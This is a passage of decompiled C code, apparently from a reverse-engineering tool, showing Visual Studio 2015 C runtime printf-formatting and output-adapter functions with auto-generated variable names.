  if (uVar1 == 1) {
    *(int *)((int)this + 0x14) = *(int *)((int)this + 0x14) + 4;
    if ((*(uint *)((int)this + 0x20) >> 4 & 1) == 0) {
      uVar4 = (uint)*(byte *)(*(int *)((int)this + 0x14) + -4);
    }
    else {
      uVar4 = (uint)*(char *)(*(int *)((int)this + 0x14) + -4);
    }
  }
  else if (uVar1 == 2) {
    *(int *)((int)this + 0x14) = *(int *)((int)this + 0x14) + 4;
    if ((*(uint *)((int)this + 0x20) >> 4 & 1) == 0) {
      uVar4 = (uint)*(ushort *)(*(int *)((int)this + 0x14) + -4);
    }
    else {
      uVar4 = (uint)*(short *)(*(int *)((int)this + 0x14) + -4);
    }
  }
  else {
    if (uVar1 != 4) {
      if (uVar1 != 8) {
        piVar2 = __errno();
        *piVar2 = 0x16;
        uVar1 = FUN_004091be();
        return uVar1 & 0xffffff00;
      }
      *(int *)((int)this + 0x14) = *(int *)((int)this + 0x14) + 8;
      uVar4 = *(uint *)(*(int *)((int)this + 0x14) + -8);
      uVar5 = *(uint *)(*(int *)((int)this + 0x14) + -4);
      goto LAB_004066d7;
    }
    *(int *)((int)this + 0x14) = *(int *)((int)this + 0x14) + 4;
    if ((*(uint *)((int)this + 0x20) >> 4 & 1) == 0) {
      uVar4 = *(uint *)(*(int *)((int)this + 0x14) + -4);
      uVar5 = 0;
      goto LAB_004066d7;
    }
    uVar4 = *(uint *)(*(int *)((int)this + 0x14) + -4);
  }
  uVar5 = (int)uVar4 >> 0x1f;
LAB_004066d7:
  if ((((*(uint *)((int)this + 0x20) >> 4 & 1) != 0) && ((int)uVar5 < 1)) && ((int)uVar5 < 0)) {
    bVar6 = uVar4 != 0;
    uVar4 = -uVar4;
    uVar5 = -(uVar5 + bVar6);
    *(uint *)((int)this + 0x20) = *(uint *)((int)this + 0x20) | 0x40;
  }
  if (*(int *)((int)this + 0x28) < 0) {
    *(undefined4 *)((int)this + 0x28) = 1;
  }
  else {
    *(uint *)((int)this + 0x20) = *(uint *)((int)this + 0x20) & 0xfffffff7;
    if (0x200 < *(int *)((int)this + 0x28)) {
      *(undefined4 *)((int)this + 0x28) = 0x200;
    }
  }
  if ((uVar4 | uVar5) == 0) {
    *(uint *)((int)this + 0x20) = *(uint *)((int)this + 0x20) & 0xffffffdf;
  }
  if (uVar1 == 8) {
    type_case_integer_parse_into_buffer__(this,CONCAT44(uVar5,uVar4),param_1,param_2);
  }
  else {
    type_case_integer_parse_into_buffer__(this,uVar4,param_1,param_2);
  }
  pcVar3 = (char *)(*(uint *)((int)this + 0x20) >> 7);
  if ((((uint)pcVar3 & 1) != 0) &&
     ((*(int *)((int)this + 0x38) == 0 || (pcVar3 = *(char **)((int)this + 0x34), *pcVar3 != '0'))))
  {
    *(int *)((int)this + 0x34) = *(int *)((int)this + 0x34) + -1;
    **(undefined **)((int)this + 0x34) = 0x30;
    *(int *)((int)this + 0x38) = *(int *)((int)this + 0x38) + 1;
  }
  return CONCAT31((int3)((uint)pcVar3 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_n(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_n(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_n(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_n(void)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

uint __fastcall type_case_n(int param_1)

{
  uint *puVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  
  *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 4;
  puVar1 = *(uint **)(*(int *)(param_1 + 0x14) + -4);
  iVar2 = __get_printf_count_output();
  if (iVar2 == 0) {
LAB_00406789:
    piVar3 = __errno();
    *piVar3 = 0x16;
    uVar4 = FUN_004091be();
    uVar4 = uVar4 & 0xffffff00;
  }
  else {
    uVar4 = __crt_stdio_output::to_integer_size(*(length_modifier *)(param_1 + 0x2c));
    if (uVar4 == 1) {
      uVar4 = 0;
      *(undefined *)puVar1 = *(undefined *)(param_1 + 0x18);
    }
    else if (uVar4 == 2) {
      uVar4 = (uint)*(ushort *)(param_1 + 0x18);
      *(ushort *)puVar1 = *(ushort *)(param_1 + 0x18);
    }
    else if (uVar4 == 4) {
      uVar4 = *(uint *)(param_1 + 0x18);
      *puVar1 = uVar4;
    }
    else {
      if (uVar4 != 8) goto LAB_00406789;
      uVar4 = *(uint *)(param_1 + 0x18);
      *puVar1 = uVar4;
      puVar1[1] = (int)uVar4 >> 0x1f;
    }
    *(undefined *)(param_1 + 0x30) = 1;
    uVar4 = CONCAT31((int3)(uVar4 >> 8),1);
  }
  return uVar4;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_o(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_o(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_o(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_o(void)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

void __fastcall type_case_o(void *param_1)

{
  if ((*(uint *)((int)param_1 + 0x20) >> 5 & 1) != 0) {
    *(uint *)((int)param_1 + 0x20) = *(uint *)((int)param_1 + 0x20) | 0x80;
  }
  type_case_integer(param_1,8,'\0');
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_p(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_p(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_p(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_p(void)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

void __fastcall type_case_p(void *param_1)

{
  *(undefined4 *)((int)param_1 + 0x28) = 8;
  *(undefined4 *)((int)param_1 + 0x2c) = 10;
  type_case_integer(param_1,0x10,'\x01');
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_s(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_s(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_s(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_s(void)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall type_case_s(__uint64 *param_1)

{
  int iVar1;
  bool bVar2;
  size_t sVar3;
  
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  sVar3 = *(size_t *)(param_1 + 5);
  iVar1 = *(int *)(*(int *)((int)param_1 + 0x14) + -4);
  *(int *)((int)param_1 + 0x34) = iVar1;
  if (sVar3 == 0xffffffff) {
    sVar3 = 0x7fffffff;
  }
  bVar2 = __crt_stdio_output::is_wide_character_specifier_char_
                    (*param_1,*(char *)((int)param_1 + 0x31),
                     *(length_modifier *)((int)param_1 + 0x2c));
  if (bVar2) {
    if (iVar1 == 0) {
      *(wchar_t **)((int)param_1 + 0x34) = L"(null)";
    }
    *(undefined *)((int)param_1 + 0x3c) = 1;
    sVar3 = _wcsnlen(*(wchar_t **)((int)param_1 + 0x34),sVar3);
  }
  else {
    if (iVar1 == 0) {
      *(char **)((int)param_1 + 0x34) = "(null)";
    }
    sVar3 = _strnlen(*(char **)((int)param_1 + 0x34),sVar3);
  }
  *(size_t *)(param_1 + 7) = sVar3;
  return CONCAT31((int3)(sVar3 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_s(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_s(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_s(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_s(void)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall type_case_s(__uint64 *param_1)

{
  int iVar1;
  bool bVar2;
  size_t sVar3;
  
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  sVar3 = *(size_t *)(param_1 + 5);
  iVar1 = *(int *)(*(int *)((int)param_1 + 0x14) + -4);
  *(int *)((int)param_1 + 0x34) = iVar1;
  if (sVar3 == 0xffffffff) {
    sVar3 = 0x7fffffff;
  }
  bVar2 = __crt_stdio_output::is_wide_character_specifier_wchar_t_
                    (*param_1,SUB21(*(undefined2 *)((int)param_1 + 0x32),0),
                     *(length_modifier *)((int)param_1 + 0x2c));
  if (bVar2) {
    if (iVar1 == 0) {
      *(wchar_t **)((int)param_1 + 0x34) = L"(null)";
    }
    *(undefined *)((int)param_1 + 0x3c) = 1;
    sVar3 = _wcsnlen(*(wchar_t **)((int)param_1 + 0x34),sVar3);
  }
  else {
    if (iVar1 == 0) {
      *(char **)((int)param_1 + 0x34) = "(null)";
    }
    sVar3 = type_case_s_compute_narrow_string_length(param_1,sVar3);
  }
  *(size_t *)(param_1 + 7) = sVar3;
  return CONCAT31((int3)(sVar3 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: int __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_s_compute_narrow_string_length(int,wchar_t)const
// 
//  private: int __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_s_compute_narrow_string_length(int,wchar_t)const
// 
//  private: int __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_s_compute_narrow_string_length(int,wchar_t)const
// 
//  private: int __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_s_compute_narrow_string_length(int,wchar_t)const
// 
//   6 names - too many to list
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

int __thiscall type_case_s_compute_narrow_string_length(void *this,int param_1)

{
  byte *pbVar1;
  int iVar2;
  
  iVar2 = 0;
  pbVar1 = *(byte **)((int)this + 0x34);
  if (0 < param_1) {
    do {
      if (*pbVar1 == 0) {
        return iVar2;
      }
      if ((*(ushort *)(***(int ***)((int)this + 8) + (uint)*pbVar1 * 2) & 0x8000) != 0) {
        pbVar1 = pbVar1 + 1;
      }
      pbVar1 = pbVar1 + 1;
      iVar2 = iVar2 + 1;
    } while (iVar2 < param_1);
  }
  return iVar2;
}



// Library Function - Single Match
//  public: bool __thiscall __crt_stdio_output::stream_output_adapter<char>::validate(void)const 
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_stdio_output::stream_output_adapter<char>::validate(stream_output_adapter_char_ *this)

{
  bool bVar1;
  int *piVar2;
  
  if (*(_iobuf **)this == (_iobuf *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004091be();
    return false;
  }
  bVar1 = __acrt_stdio_char_traits<char>::validate_stream_is_ansi_if_required(*(_iobuf **)this);
  return bVar1;
}



// Library Function - Single Match
//  public: static bool __cdecl
// __acrt_stdio_char_traits<char>::validate_stream_is_ansi_if_required(struct _iobuf * const)
// 
// Library: Visual Studio 2015 Release

bool __cdecl __acrt_stdio_char_traits<char>::validate_stream_is_ansi_if_required(_iobuf *param_1)

{
  bool bVar1;
  uint uVar2;
  undefined *puVar3;
  int *piVar4;
  undefined *puVar5;
  
  if (((uint)param_1->_flag >> 0xc & 1) == 0) {
    uVar2 = __fileno(param_1);
    puVar5 = &DAT_0041b0f8;
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar3 = &DAT_0041b0f8;
    }
    else {
      puVar3 = (undefined *)((uVar2 & 0x3f) * 0x30 + (&DAT_0041bfc8)[(int)uVar2 >> 6]);
    }
    if (puVar3[0x29] == '\0') {
      if ((uVar2 != 0xffffffff) && (uVar2 != 0xfffffffe)) {
        puVar5 = (undefined *)((uVar2 & 0x3f) * 0x30 + (&DAT_0041bfc8)[(int)uVar2 >> 6]);
      }
      if ((puVar5[0x2d] & 1) == 0) goto LAB_004069e0;
    }
    piVar4 = __errno();
    *piVar4 = 0x16;
    FUN_004091be();
    bVar1 = false;
  }
  else {
LAB_004069e0:
    bVar1 = true;
  }
  return bVar1;
}



// Library Function - Single Match
//  public: void __thiscall
// __crt_stdio_output::stream_output_adapter<char>::write_character(char,int * const)const 
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_stdio_output::stream_output_adapter<char>::write_character
          (stream_output_adapter_char_ *this,char param_1,int *param_2)

{
  uint uVar1;
  
  if ((((*(uint *)(*(int *)this + 0xc) >> 0xc & 1) == 0) || (*(int *)(*(int *)this + 4) != 0)) &&
     (uVar1 = __fputc_nolock(param_1,*(FILE **)this), uVar1 == 0xffffffff)) {
    *param_2 = -1;
    return;
  }
  *param_2 = *param_2 + 1;
  return;
}



// Library Function - Single Match
//  public: bool __thiscall
// __crt_stdio_output::string_output_adapter<char>::write_character(char,int * const)const 
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_stdio_output::string_output_adapter<char>::write_character
          (string_output_adapter_char_ *this,char param_1,int *param_2)

{
  int iVar1;
  undefined uVar2;
  
  iVar1 = *(int *)this;
  if (*(int *)(iVar1 + 8) == *(int *)(iVar1 + 4)) {
    if (*(char *)(iVar1 + 0xc) == '\0') {
      *param_2 = -1;
    }
    else {
      *param_2 = *param_2 + 1;
    }
    uVar2 = *(undefined *)(*(int *)this + 0xc);
  }
  else {
    *param_2 = *param_2 + 1;
    *(int *)(*(int *)this + 8) = *(int *)(*(int *)this + 8) + 1;
    ***(char ***)this = param_1;
    **(int **)this = **(int **)this + 1;
    uVar2 = 1;
  }
  return (bool)uVar2;
}



// Library Function - Single Match
//  public: bool __thiscall
// __crt_stdio_output::string_output_adapter<wchar_t>::write_character(wchar_t,int * const)const 
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_stdio_output::string_output_adapter<wchar_t>::write_character
          (string_output_adapter_wchar_t_ *this,wchar_t param_1,int *param_2)

{
  int iVar1;
  undefined uVar2;
  undefined in_stack_00000005;
  
  iVar1 = *(int *)this;
  if (*(int *)(iVar1 + 8) == *(int *)(iVar1 + 4)) {
    if (*(char *)(iVar1 + 0xc) == '\0') {
      *param_2 = -1;
    }
    else {
      *param_2 = *param_2 + 1;
    }
    uVar2 = *(undefined *)(*(int *)this + 0xc);
  }
  else {
    *param_2 = *param_2 + 1;
    *(int *)(*(int *)this + 8) = *(int *)(*(int *)this + 8) + 1;
    *(undefined2 *)**(undefined4 **)this = _param_1;
    **(int **)this = **(int **)this + 2;
    uVar2 = 1;
  }
  return (bool)uVar2;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::write_stored_string_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::write_stored_string_tchar(char)
// 
// Library: Visual Studio 2015 Release

void __fastcall write_stored_string_tchar(int param_1)

{
  wchar_t _WCh;
  errno_t eVar1;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  int iVar2;
  wchar_t *pwVar3;
  int in_stack_ffffffec;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if ((*(char *)(param_1 + 0x3c) == '\0') || (*(int *)(param_1 + 0x38) < 1)) {
    __crt_stdio_output::stream_output_adapter<char>::write_string
              ((stream_output_adapter_char_ *)(param_1 + 0x448),*(char **)(param_1 + 0x34),
               *(int *)(param_1 + 0x38),(int *)(param_1 + 0x18),*(int **)(param_1 + 0xc));
    in_DL = extraout_DL_01;
  }
  else {
    pwVar3 = *(wchar_t **)(param_1 + 0x34);
    iVar2 = 0;
    if (*(int *)(param_1 + 0x38) != 0) {
      do {
        _WCh = *pwVar3;
        pwVar3 = pwVar3 + 1;
        in_stack_ffffffec = 0;
        eVar1 = _wctomb_s((int *)&stack0xffffffec,local_10,6,_WCh);
        if ((eVar1 != 0) || (in_stack_ffffffec == 0)) {
          *(undefined4 *)(param_1 + 0x18) = 0xffffffff;
          in_DL = extraout_DL;
          break;
        }
        __crt_stdio_output::stream_output_adapter<char>::write_string
                  ((stream_output_adapter_char_ *)(param_1 + 0x448),local_10,in_stack_ffffffec,
                   (int *)(param_1 + 0x18),*(int **)(param_1 + 0xc));
        iVar2 = iVar2 + 1;
        in_DL = extraout_DL_00;
      } while (iVar2 != *(int *)(param_1 + 0x38));
    }
  }
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,in_DL,(char)in_stack_ffffffec);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::write_stored_string_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::write_stored_string_tchar(char)
// 
// Library: Visual Studio 2015 Release

void __fastcall write_stored_string_tchar(int param_1)

{
  wchar_t _WCh;
  errno_t eVar1;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  int iVar2;
  wchar_t *pwVar3;
  int in_stack_ffffffec;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  if ((*(char *)(param_1 + 0x3c) == '\0') || (*(int *)(param_1 + 0x38) < 1)) {
    __crt_stdio_output::string_output_adapter<char>::write_string
              ((string_output_adapter_char_ *)(param_1 + 0x448),*(char **)(param_1 + 0x34),
               *(int *)(param_1 + 0x38),(int *)(param_1 + 0x18),*(int **)(param_1 + 0xc));
    in_DL = extraout_DL_01;
  }
  else {
    pwVar3 = *(wchar_t **)(param_1 + 0x34);
    iVar2 = 0;
    if (*(int *)(param_1 + 0x38) != 0) {
      do {
        _WCh = *pwVar3;
        pwVar3 = pwVar3 + 1;
        in_stack_ffffffec = 0;
        eVar1 = _wctomb_s((int *)&stack0xffffffec,local_10,6,_WCh);
        if ((eVar1 != 0) || (in_stack_ffffffec == 0)) {
          *(undefined4 *)(param_1 + 0x18) = 0xffffffff;
          in_DL = extraout_DL;
          break;
        }
        __crt_stdio_output::string_output_adapter<char>::write_string
                  ((string_output_adapter_char_ *)(param_1 + 0x448),local_10,in_stack_ffffffec,
                   (int *)(param_1 + 0x18),*(int **)(param_1 + 0xc));
        iVar2 = iVar2 + 1;
        in_DL = extraout_DL_00;
      } while (iVar2 != *(int *)(param_1 + 0x38));
    }
  }
  FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,in_DL,(char)in_stack_ffffffec);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::write_stored_string_tchar(wchar_t)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::write_stored_string_tchar(wchar_t)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall write_stored_string_tchar(uint param_1)

{
  int *piVar1;
  int *piVar2;
  char *_SrcCh;
  int iVar3;
  uint local_8;
  uint3 extraout_var;
  
  local_8 = param_1;
  if ((*(char *)(param_1 + 0x3c) == '\0') && (piVar2 = *(int **)(param_1 + 0x38), 0 < (int)piVar2))
  {
    _SrcCh = *(char **)(param_1 + 0x34);
    iVar3 = 0;
    if (piVar2 != (int *)0x0) {
      do {
        local_8 = local_8 & 0xffff0000;
        piVar1 = (int *)__mbtowc_l((wchar_t *)&local_8,_SrcCh,
                                   (*(_locale_t *)(param_1 + 8))->locinfo->lc_codepage,
                                   *(_locale_t *)(param_1 + 8));
        if ((int)piVar1 < 1) {
          *(undefined4 *)(param_1 + 0x18) = 0xffffffff;
          piVar2 = piVar1;
          break;
        }
        __crt_stdio_output::string_output_adapter<wchar_t>::write_character
                  ((string_output_adapter_wchar_t_ *)(param_1 + 0x448),SUB41(local_8,0),
                   (int *)(param_1 + 0x18));
        piVar2 = (int *)((uint)extraout_var << 8);
        _SrcCh = _SrcCh + (int)piVar1;
        iVar3 = iVar3 + 1;
      } while (iVar3 != *(int *)(param_1 + 0x38));
    }
  }
  else {
    piVar2 = (int *)(param_1 + 0x18);
    __crt_stdio_output::string_output_adapter<wchar_t>::write_string
              ((string_output_adapter_wchar_t_ *)(param_1 + 0x448),*(wchar_t **)(param_1 + 0x34),
               *(int *)(param_1 + 0x38),piVar2,*(int **)(param_1 + 0xc));
  }
  return CONCAT31((int3)((uint)piVar2 >> 8),1);
}



// Library Function - Single Match
//  public: void __thiscall __crt_stdio_output::stream_output_adapter<char>::write_string(char const
// * const,int,int * const,int * const)const 
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_stdio_output::stream_output_adapter<char>::write_string
          (stream_output_adapter_char_ *this,char *param_1,int param_2,int *param_3,int *param_4)

{
  int iVar1;
  char *pcVar2;
  
  if (((*(uint *)(*(int *)this + 0xc) >> 0xc & 1) == 0) || (*(int *)(*(int *)this + 4) != 0)) {
    pcVar2 = param_1 + param_2;
    iVar1 = *param_4;
    *param_4 = 0;
    if (param_1 != pcVar2) {
      do {
        write_character(this,*param_1,param_3);
        if (*param_3 == -1) {
          if (*param_4 != 0x2a) break;
          write_character(this,'?',param_3);
        }
        param_1 = param_1 + 1;
      } while (param_1 != pcVar2);
    }
    if ((*param_4 == 0) && (iVar1 != 0)) {
      *param_4 = iVar1;
    }
  }
  else {
    *param_3 = *param_3 + param_2;
  }
  return;
}



// Library Function - Single Match
//  public: void __thiscall __crt_stdio_output::string_output_adapter<char>::write_string(char const
// * const,int,int * const,int * const)const 
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_stdio_output::string_output_adapter<char>::write_string
          (string_output_adapter_char_ *this,char *param_1,int param_2,int *param_3,int *param_4)

{
  int iVar1;
  void **ppvVar2;
  uint _Size;
  
  iVar1 = *param_4;
  *param_4 = 0;
  ppvVar2 = *(void ***)this;
  if (ppvVar2[2] == ppvVar2[1]) {
    if (*(char *)(ppvVar2 + 3) == '\0') {
      *param_3 = -1;
    }
    else {
      *param_3 = *param_3 + param_2;
    }
  }
  else {
    _Size = (int)ppvVar2[1] - (int)ppvVar2[2];
    if ((uint)param_2 <= _Size) {
      _Size = param_2;
    }
    FID_conflict__memcpy(*ppvVar2,param_1,_Size);
    **(int **)this = **(int **)this + _Size;
    *(int *)(*(int *)this + 8) = *(int *)(*(int *)this + 8) + _Size;
    if (*(char *)(*(int *)this + 0xc) == '\0') {
      if (_Size == param_2) {
        *param_3 = *param_3 + _Size;
      }
      else {
        *param_3 = -1;
      }
    }
    else {
      *param_3 = *param_3 + param_2;
    }
  }
  if ((*param_4 == 0) && (iVar1 != 0)) {
    *param_4 = iVar1;
  }
  return;
}



// Library Function - Single Match
//  public: void __thiscall __crt_stdio_output::string_output_adapter<wchar_t>::write_string(wchar_t
// const * const,int,int * const,int * const)const 
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_stdio_output::string_output_adapter<wchar_t>::write_string
          (string_output_adapter_wchar_t_ *this,wchar_t *param_1,int param_2,int *param_3,
          int *param_4)

{
  int iVar1;
  void **ppvVar2;
  uint uVar3;
  
  iVar1 = *param_4;
  *param_4 = 0;
  ppvVar2 = *(void ***)this;
  if (ppvVar2[2] == ppvVar2[1]) {
    if (*(char *)(ppvVar2 + 3) == '\0') {
      *param_3 = -1;
    }
    else {
      *param_3 = *param_3 + param_2;
    }
  }
  else {
    uVar3 = (int)ppvVar2[1] - (int)ppvVar2[2];
    if ((uint)param_2 <= uVar3) {
      uVar3 = param_2;
    }
    FID_conflict__memcpy(*ppvVar2,param_1,uVar3 * 2);
    **(int **)this = **(int **)this + uVar3 * 2;
    *(int *)(*(int *)this + 8) = *(int *)(*(int *)this + 8) + uVar3;
    if (*(char *)(*(int *)this + 0xc) == '\0') {
      if (uVar3 == param_2) {
        *param_3 = *param_3 + uVar3;
      }
      else {
        *param_3 = -1;
      }
    }
    else {
      *param_3 = *param_3 + param_2;
    }
  }
  if ((*param_4 == 0) && (iVar1 != 0)) {
    *param_4 = iVar1;
  }
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___stdio_common_vfprintf
//  ___stdio_common_vfprintf_p
//  ___stdio_common_vfprintf_s
//  ___stdio_common_vfwprintf
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl
FID_conflict____stdio_common_vfprintf
          (undefined4 param_1,undefined4 param_2,FILE *param_3,int param_4,undefined4 param_5,
          undefined4 param_6)

{
  int *piVar1;
  undefined4 uVar2;
  FILE **local_30;
  undefined4 *local_2c;
  undefined4 *local_28;
  int *local_24;
  undefined4 *local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  int local_10;
  undefined4 local_c;
  FILE *local_8;
  
  local_14 = param_6;
  local_c = param_5;
  local_1c = param_1;
  local_10 = param_4;
  local_8 = param_3;
  local_18 = param_2;
  if ((param_3 == (FILE *)0x0) || (param_4 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    uVar2 = 0xffffffff;
  }
  else {
    local_30 = &local_8;
